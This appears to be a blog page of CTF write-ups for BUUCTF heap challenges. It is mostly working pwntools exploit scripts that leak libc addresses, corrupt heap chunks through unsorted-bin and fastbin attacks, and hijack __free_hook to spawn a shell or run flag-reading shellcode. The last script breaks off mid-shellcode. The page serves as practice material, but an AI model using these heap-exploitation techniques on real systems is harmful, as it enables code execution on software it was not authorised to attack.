<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ACTF_2019_ACTFNOTE&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26733</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *0x400A20</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/4xg 0x6020E0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">0x20</span></span><br><span class="line">def add(size: <span class="type">int</span>, name: bytes, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;/$ &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;note name size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;input note name: &quot;</span>, name)</span><br><span class="line">    sa(b<span class="string">&quot;note content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;/$ &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;/$ &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;/$ &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;input note id: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;input new note content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span> * <span class="number">0x17</span> + <span class="string">&quot;\xde&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(b<span class="string">&quot;\xde&quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x7FB6238E23F2</span> + <span class="number">0x7FB623854000</span></span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>, b<span class="string">&quot;/bin/sh\0&quot;</span> + b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">-15</span> + (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)))</span><br><span class="line">add(<span class="number">-0x100</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">edit(<span class="number">2</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">edit(<span class="number">0</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><h3 id="cscctf-2019-final-childrenheap"><a href="#cscctf-2019-final-childrenheap" class="headerlink" title="cscctf_2019_final_childrenheap"></a>cscctf_2019_final_childrenheap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cscctf_2019_final_childrenheap">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>同样利用unsorted bin attack,不过在我们利用unsorted bin attack修改free——hook上方之前可以先free掉0xx68的块，这样不需要修复unsorted bin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./cscctf_2019_final_childrenheap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28960</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *$rebase(0xD48)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x2020A0)</span></span><br><span class="line"><span class="string">    x/5xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(index: <span class="type">int</span>, size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line">    sla(b<span class="string">&quot;Size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index:&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0xB0</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7F26245F0B78</span> + <span class="number">0x7F262422C000</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xE8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">global_max_fast_offset = <span class="number">0x3C67F8</span></span><br><span class="line">edit(<span class="number">5</span>, p64(<span class="number">0</span>) + p64(libc_base + global_max_fast_offset - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x28</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">6</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">    + p64(<span class="number">0x21</span>)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>] - <span class="number">0x1D</span>)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(<span class="number">0xD1</span>),</span><br><span class="line">)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>] - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x68</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf_2019_babyheap"></a>rctf_2019_babyheap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rctf_2019_babyheap">BUUCTF在线评测</a></p>
<p>这个题目挺复杂的，需要好好分析</p>
<p>感想都在下面</p>
<p>这里就是exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./rctf_2019_babyheap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">    global_max_fast_offset = <span class="number">0x3C67F8</span></span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line">    lobal_max_fast_offset = <span class="number">0x0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line">    lobal_max_fast_offset = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29090</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    <span class="meta"># calloc b *$rebase(0x10FE)</span></span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b *$rebase(0x11E7)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x202110)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;=<span class="number">4096</span> 无洞</span><br><span class="line">def add(size: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Size: &quot;</span>, str(size).encode())</span><br><span class="line"></span><br><span class="line"># 不会溢出</span><br><span class="line">def edit(index: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">def convert_frame_bytes(frame):</span><br><span class="line">    res = b<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in frame.values():</span><br><span class="line">        res += p64(i)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)  # <span class="number">0</span></span><br><span class="line">add(<span class="number">0x18</span>)  # <span class="number">1</span></span><br><span class="line">add(<span class="number">0xF8</span>)  # <span class="number">2</span></span><br><span class="line">add(<span class="number">0x600</span>)  # <span class="number">3</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x40</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>)  # <span class="number">0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(rld().ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) + <span class="number">0x7F6913DBD000</span> - <span class="number">0x7F6914181B78</span></span><br><span class="line">add(<span class="number">0x118</span>)  # <span class="number">2</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x28</span>)  # <span class="number">1</span></span><br><span class="line">add(<span class="number">0xE8</span>)  # <span class="number">4</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">global_max_fast_addr = libc_base + global_max_fast_offset</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(global_max_fast_addr - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x28</span>)  # <span class="number">1</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">    + p64(<span class="number">0x71</span>)</span><br><span class="line">    + p64(<span class="number">0</span>)</span><br><span class="line">    + p64(free_hook_addr - <span class="number">0x20</span>)</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">11</span></span><br><span class="line">    + p64(<span class="number">0x81</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x71</span>) + p64(free_hook_addr - <span class="number">0x13</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">new_addr = free_hook_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">mprotect_addr = libc.sym[<span class="string">&quot;mprotect&quot;</span>] + libc_base</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook_addr + <span class="number">0x8</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = mprotect_addr</span><br><span class="line">edit(<span class="number">3</span>, convert_frame_bytes(frame))</span><br><span class="line">setcontext_addr = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">shellcode = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,&#123;convert_str_asmencode(&quot;</span>././flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov 